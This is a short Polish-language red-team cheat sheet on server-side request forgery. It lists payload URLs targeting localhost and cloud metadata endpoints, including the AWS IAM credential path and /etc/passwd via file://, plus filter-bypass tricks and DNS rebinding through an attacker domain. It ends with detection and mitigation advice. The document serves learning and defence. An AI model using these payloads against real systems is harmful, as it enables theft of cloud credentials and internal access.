---
title: "Server-Side Request Forgery (SSRF)"
category: "red-team"
tags: ["web", "ssrf", "owasp", "cloud"]
platform: "web"
mitre: ["T1190"]
difficulty: "advanced"
updated: "2026-07-11"
author: "core"
---

# Server-Side Request Forgery (SSRF)

## TL;DR
Aplikacja pobiera URL podany przez użytkownika → zmuszasz serwer do żądań do zasobów wewnętrznych (metadata chmury, usługi wewnętrzne, port scan). W chmurze prowadzi do kradzieży credentiali IAM.

## Payloady
```text
http://127.0.0.1:80/           # localhost
http://169.254.169.254/        # cloud metadata (AWS/GCP/Azure)
http://[::1]/                  # IPv6 loopback
file:///etc/passwd             # file scheme
gopher://...                   # smuggling do usług (Redis, SMTP)
```

## Cloud metadata (klucz w SSRF)
```bash
# AWS IMDSv1 (jeśli włączone) – kradzież ról
http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
# GCP (wymaga nagłówka)
http://metadata.google.internal/computeMetadata/v1/  (Metadata-Flavor: Google)
# Azure IMDS
http://169.254.169.254/metadata/instance?api-version=2021-02-01 (Metadata: true)
```

## Omijanie filtrów
```text
http://0177.0.0.1     (octal)   http://2130706433 (decimal)
http://localhost.attacker.com   (DNS rebinding)
http://foo@127.0.0.1  (userinfo)  redirecty 301->internal
```

## Wykrywanie (Blue Team)
- Serwer aplikacyjny łączący się do `169.254.169.254` / wewnętrznych IP.
- Anomalne żądania wychodzące z warstwy aplikacji.

## Mitygacja / Hardening
- **IMDSv2** (AWS, wymaga tokenu — blokuje proste SSRF), usuń IMDSv1.
- Allow-list docelowych hostów, blokuj RFC1918/link-local, walidacja po rozwiązaniu DNS.
- Segmentacja sieci, brak dostępu app→metadata gdy zbędny.

## Źródła
- [PortSwigger – SSRF](https://portswigger.net/web-security/ssrf)
